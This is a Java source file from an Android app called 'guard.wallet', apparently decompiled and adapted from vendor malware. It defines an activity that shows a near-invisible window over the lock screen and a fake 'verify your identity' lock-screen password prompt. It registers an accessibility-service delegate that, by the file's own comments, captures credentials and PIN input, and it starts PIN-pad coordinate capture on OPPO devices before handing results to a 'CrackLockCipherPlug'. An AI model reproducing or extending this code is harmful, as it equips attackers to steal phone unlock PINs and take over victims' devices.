package com.guard.wallet.activity;

import com.guard.wallet.core.AppUtils;
import android.app.Activity;
import android.app.KeyguardManager;
import android.content.Intent;
import android.graphics.Rect;
import android.hardware.biometrics.BiometricPrompt;
import android.os.Bundle;
import android.os.CancellationSignal;
import android.os.Build;
import android.util.Log;
import android.view.View;
import android.view.WindowManager;
import com.guard.wallet.biometric.BiometricAuthCallback;
import com.guard.wallet.biometric.BiometricCancelListener;
import com.guard.wallet.MainApplication;
import com.guard.wallet.helper.OverlayViewHelper;
import com.guard.wallet.plug.CrackLockCipherPlug;
import com.guard.wallet.service.MyAccessibilityService;
import com.guard.wallet.utils.LocateValuesUtils;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicReference;

/**
 * 设备凭据确认 Activity — 用于生物识别/锁屏密码验证。
 *
 * API 30+ 使用 {@link BiometricPrompt} 弹出生物识别或锁屏密码验证对话框；
 * 低版本使用 {@link KeyguardManager#createConfirmDeviceCredentialIntent} 启动系统凭据确认界面。
 *
 * 验证成功后通过 {@link #notifyCredentialResult()} 将事件码传递给 CrackLockCipherPlug，
 * 并通知 OPPO/鸿蒙系 helper 完成后续解锁流程。
 *
 * vendor 原始路径: com/guard/wallet/activity/ConfirmDeviceActivity.java
 */
public class ConfirmDeviceActivity extends Activity {
    /** 当前 Activity 单例引用（volatile 保证多线程可见性） */
    public static volatile ConfirmDeviceActivity instance;

    /** 凭据验证事件码（由 Intent extras 传入，验证成功后传递给 CrackLockCipherPlug） */
    public static final AtomicReference<String> eventCodeRef = new AtomicReference<>(null);

    /** 验证对话框标题 */
    public String title = "";

    /** 验证对话框副标题 */
    public String subtitle = "";

    /** 验证对话框描述文本 */
    @SuppressWarnings("unused")
    public String description = "";

    /** 是否已发起验证（防止 onResume 重复触发） */
    public final AtomicBoolean initiated = new AtomicBoolean(false);

    /**
     * 通知 CrackLockCipherPlug 凭据验证结果。
     * 将 eventCodeRef 中的事件码设置到 plug 并触发回调；
     * 同时通知 OPPO/鸿蒙系 helper。
     */
    public static void notifyCredentialResult() {
        MainApplication app = MainApplication.getInstance();
        AtomicReference<String> ref = eventCodeRef;
        if (app != null && app.getCrackLockCipherPlug() != null) {
            CrackLockCipherPlug plug = app.getCrackLockCipherPlug();
            String code = ref.get();
            plug.getClass();
            CrackLockCipherPlug.cipherCodeRef.set(code);
            CrackLockCipherPlug.delaySeconds = 1L;
            CrackLockCipherPlug.startMonitoring();
        }

        if (OverlayViewHelper.i() || OverlayViewHelper.h()) {
            OverlayViewHelper.f(ref.get(), true);
        }
    }

    /** 获取当前 ConfirmDeviceActivity 单例（线程安全） */
    public static ConfirmDeviceActivity getInstance() {
        synchronized (ConfirmDeviceActivity.class) {
            return instance;
        }
    }

    @Override
    public final void finish() {
        if (MyAccessibilityService.P() != null) {
            MyAccessibilityService svc = MyAccessibilityService.P();
            ConcurrentLinkedQueue queue = svc.a;
            try {
                if (!queue.isEmpty()) {
                    com.guard.wallet.infra.DelegateRemovePredicate pred = new com.guard.wallet.infra.DelegateRemovePredicate(svc, 9);
                    queue.removeIf(pred);
                }
            } catch (Exception ex) {
                AppUtils.s("com.guard.wallet.service.AccessibilityDelegateManager", ex);
            }
            MyAccessibilityService.P().g.X(com.guard.wallet.enums.LockState.b);
        }
        super.finish();
    }

    @Override
    public final void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (requestCode == 1001) {
            if (resultCode == -1) {
                notifyCredentialResult();
            }
            this.finish();
        }
    }

    @Override
    public final void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Bundle extras = this.getIntent().getExtras();
        if (extras != null) {
            this.title = extras.getString("CONFIRM_DEVICE_CREDENTIAL_TITLE");
            this.subtitle = extras.getString("CONFIRM_DEVICE_CREDENTIAL_SUB_TITLE");
            this.description = extras.getString("CONFIRM_DEVICE_CREDENTIAL_DESCRIPTION");
            eventCodeRef.set(extras.getString("CONFIRM_FOR_EVENT_CODE"));
        } else {
            this.title = "Verify personal identity";
            this.subtitle = "Privacy protection";
            this.description = "To protect your privacy, please enter your lock screen password to verify that you are the one making the operation.";
            eventCodeRef.set("PREPARE_FOR_APP_CONFIRM_LOCK");
        }

        View view = new View(this);
        if (Build.VERSION.SDK_INT >= 30) {
            try {
                Rect bounds = com.guard.wallet.infra.AccessibilityCompat.getMetricsBounds(com.guard.wallet.infra.AccessibilityCompat.getWindowMetrics(this.getWindow().getWindowManager()));
                view.layout(bounds.left, bounds.top, bounds.right, bounds.bottom);
            } catch (Exception ignored) {
            }
        }
        this.setContentView(view);

        WindowManager.LayoutParams attrs = this.getWindow().getAttributes();
        attrs.dimAmount = 0.0F;
        attrs.x = 0;
        attrs.y = 0;
        attrs.width = 1;
        attrs.height = 1;
        attrs.gravity = 8388661; // Gravity.START | Gravity.TOP
        this.getWindow().setAttributes(attrs);
        this.getWindow().getDecorView().setBackgroundColor(0);
        this.getWindow().setFlags(1024, 1024);   // FLAG_FULLSCREEN
        this.getWindow().addFlags(32);            // FLAG_KEEP_SCREEN_ON
        this.getWindow().addFlags(16);            // FLAG_BLUR_BEHIND
        this.getWindow().addFlags(67108864);      // FLAG_DISMISS_KEYGUARD
        this.getWindow().addFlags(134217728);     // FLAG_SHOW_WHEN_LOCKED
        this.getWindow().addFlags(262144);        // FLAG_TURN_SCREEN_ON

        instance = this;
        com.guard.wallet.utils.SharedPrefsManager.I();
    }

    @Override
    public final void onDestroy() {
        Log.e("ConfirmDeviceActivity",
                "ConfirmDeviceActivity onDestroy:" + Thread.currentThread().getId());
        super.onDestroy();
        if (instance != null) {
            synchronized (ConfirmDeviceActivity.class) {
                instance = null;
            }
        }
    }

    @Override
    public final void onResume() {
        super.onResume();
        Log.e("ConfirmDeviceActivity",
                "ConfirmDeviceActivity onResume:" + Thread.currentThread().getId());

        if (this.initiated.get()) {
            return;
        }

        try {
            if (MyAccessibilityService.P() == null) {
                return;
            }

            // Register ConfirmDeviceCredentialDelegate for credential capture
            if (!MyAccessibilityService.P().f()) {
                MyAccessibilityService svc = MyAccessibilityService.P();
                ConcurrentLinkedQueue queue = svc.a;
                // 先移除旧的 (如果有)
                if (svc.f()) {
                    try {
                        if (!queue.isEmpty()) {
                            com.guard.wallet.infra.DelegateRemovePredicate pred = new com.guard.wallet.infra.DelegateRemovePredicate(svc, 9);
                            queue.removeIf(pred);
                        }
                    } catch (Exception ex) {
                        AppUtils.s("ConfirmDeviceActivity", ex);
                    }
                }
                // 注册 ConfirmDeviceCredentialDelegate 监听 PIN 输入
                try {
                    com.guard.wallet.delegate.ConfirmDeviceCredentialDelegate delegate =
                            new com.guard.wallet.delegate.ConfirmDeviceCredentialDelegate();
                    queue.add(delegate);
                    svc.t(com.guard.wallet.delegate.ConfirmDeviceCredentialDelegate.class.getName(),
                            com.guard.wallet.delegate.ConfirmDeviceCredentialDelegate.M());
                    Log.e("ConfirmDeviceActivity", "ConfirmDeviceCredentialDelegate 已注册");
                } catch (Exception ex) {
                    AppUtils.s("ConfirmDeviceActivity", ex);
                }
            } else {
                Log.e("ConfirmDeviceActivity", "ConfirmDeviceCredentialDelegate 已存在，跳过注册");
            }

            // ADAPT: OPPO API>=33 — 在后台线程启动 getevent 坐标捕获
            if (com.guard.wallet.plug.OppoPinPadCapture.shouldUseCoordinateCapture()) {
                Log.e("ConfirmDeviceActivity", "OPPO 坐标捕获模式: 启动 getevent");
                new Thread(() -> com.guard.wallet.plug.OppoPinPadCapture.startCapture(30)).start();
            }

            com.guard.wallet.enums.LockState lockState = com.guard.wallet.enums.LockState.d;

            if (Build.VERSION.SDK_INT >= 30) {
                // Use BiometricPrompt for API 30+
                BiometricPrompt.Builder builder = new BiometricPrompt.Builder(this);
                builder.setTitle(this.title);
                builder.setSubtitle(this.subtitle);
                builder.setDescription(this.description);
                // ADAPT: vendor calls android.support.v4.view.a.o() and complex builder chain
                // Simplified to direct BiometricPrompt API
                builder.setDeviceCredentialAllowed(true);
                BiometricPrompt prompt = builder.build();
                CancellationSignal cancel = new CancellationSignal();
                BiometricCancelListener listener = new BiometricCancelListener();
                cancel.setOnCancelListener(listener);
                this.initiated.set(true);
                MyAccessibilityService.P().g.X(lockState);
                BiometricAuthCallback callback = new BiometricAuthCallback();
                prompt.authenticate(cancel, this.getMainExecutor(), callback);
            } else {
                // Use KeyguardManager for older APIs
                KeyguardManager km = (KeyguardManager) this.getSystemService("keyguard");
                if (km == null) {
                    return;
                }
                Intent confirmIntent = km.createConfirmDeviceCredentialIntent(
                        com.guard.wallet.utils.LocateValuesUtils.getValue(this.title), this.description);
                confirmIntent.addFlags(536870912);  // FLAG_ACTIVITY_NEW_DOCUMENT
                confirmIntent.addFlags(67108864);    // FLAG_ACTIVITY_CLEAR_TOP
                confirmIntent.addFlags(8388608);     // FLAG_ACTIVITY_NO_HISTORY
                this.initiated.set(true);
                MyAccessibilityService.P().g.X(lockState);
                this.startActivityForResult(confirmIntent, 1001);
            }
        } catch (Exception ex) {
            AppUtils.s("ConfirmDeviceActivity", ex);
        }
    }

    @Override
    public final void onStart() {
        super.onStart();
        Log.e("ConfirmDeviceActivity",
                "ConfirmDeviceActivity onStart:" + Thread.currentThread().getId());
    }

    @Override
    public final void onStop() {
        Log.e("ConfirmDeviceActivity",
                "ConfirmDeviceActivity onStop:" + Thread.currentThread().getId());
        super.onStop();
    }
}
